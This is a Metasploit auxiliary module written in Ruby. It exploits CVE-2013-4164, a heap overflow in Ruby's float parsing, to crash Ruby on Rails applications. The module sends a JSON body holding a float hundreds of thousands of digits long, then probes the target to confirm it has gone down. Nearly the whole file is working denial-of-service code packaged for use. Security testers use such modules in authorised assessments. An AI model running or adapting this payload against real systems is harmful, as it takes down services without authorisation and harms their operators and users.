##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ruby on Rails JSON Processor Floating Point Heap Overflow DoS',
      'Description'    => %q{
        When Ruby attempts to convert a string representation of a large floating point
        decimal number to its floating point equivalent, a heap-based buffer overflow
        can be triggered. This module has been tested successfully on a Ruby on Rails application
        using Ruby version 1.9.3-p448 with WebRick and Thin web servers, where the Rails application
        crashes with a segfault error. Other versions of Ruby are reported to be affected.
      },
      'Author'         =>
        [
          'Charlie Somerville', # original discoverer
          'joev', # bash PoC
          'todb', # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-4164' ],
          [ 'OSVDB', '100113' ],
          [ 'URL', 'https://www.ruby-lang.org/en/news/2013/11/22/ruby-1-9-3-p484-is-released/' ]
        ],
      'DisclosureDate' => 'Nov 22 2013'))
    register_options(
      [
        OptString.new('TARGETURI', [false, 'The URL of the vulnerable Rails application', '/']),
        OptString.new('HTTPVERB', [false, 'The HTTP verb to use', 'POST'])
      ], self.class)
  end

  def uri
    normalize_uri(target_uri.path.to_s)
  end

  def verb
    datastore['HTTPVERB'] || 'POST'
  end

  def digit_pattern
    @digit_pattern ||= rand(10_000).to_s
  end

  def integer_part
    digit_pattern
  end

  def multiplier
    (500_000 * (1.0/digit_pattern.size)).to_i
  end

  def fractional_part
    digit_pattern * multiplier
  end

  # The evil_float seems to require some repeating element. Maybe
  # it's just superstition, but straight up 300_002-lenth random
  # numbers don't appear to trigger the vulnerability. Also, these are
  # easier to produce, and slightly better than the static "1.1111..."
  # for 300,000 decimal places.
  def evil_float_string
    [integer_part,fractional_part].join('.')
  end

  def run
    print_status "#{peer} - Using digit pattern of #{digit_pattern} taken to #{multiplier} places"
    sploit = '['
    sploit << evil_float_string
    sploit << ']'
    print_status "#{peer} - Sending DoS HTTP#{datastore['SSL'] ? 'S' : ''} #{verb} request to #{uri}"
    target_available = true

    begin
      res = send_request_cgi(
        {
          'method'  => verb,
          'uri'     => uri,
          'ctype'   => "application/json",
          'data'    => sploit
        })
    rescue ::Rex::ConnectionRefused
      print_error "#{peer} - Unable to connect. (Connection refused)"
      target_available = false
    rescue ::Rex::HostUnreachable
      print_error "#{peer} - Unable to connect. (Host unreachable)"
      target_available = false
    rescue ::Rex::ConnectionTimeout
      print_error "#{peer} - Unable to connect. (Timeout)"
      target_available = false
    end

    return unless target_available

    print_status "#{peer} - Checking availability"
    begin
      res = send_request_cgi({
        'method' => verb,
        'uri' => uri,
        'ctype' => "application/json",
        'data' => Rex::Text.rand_text_alpha(1+rand(64)).to_json
      })
      if res and res.body and res.body.size > 0
        target_available = true
      else
        print_good "#{peer}#{uri} - DoS appears successful (No useful response from host)"
        target_available = false
      end
    rescue ::Rex::ConnectionError, Errno::ECONNRESET
      print_good "#{peer} - DoS appears successful (Host unreachable)"
      target_available = false
    end

    return unless target_available

    print_status "#{peer} - Target is still responsive, DoS was unsuccessful."

  end
end
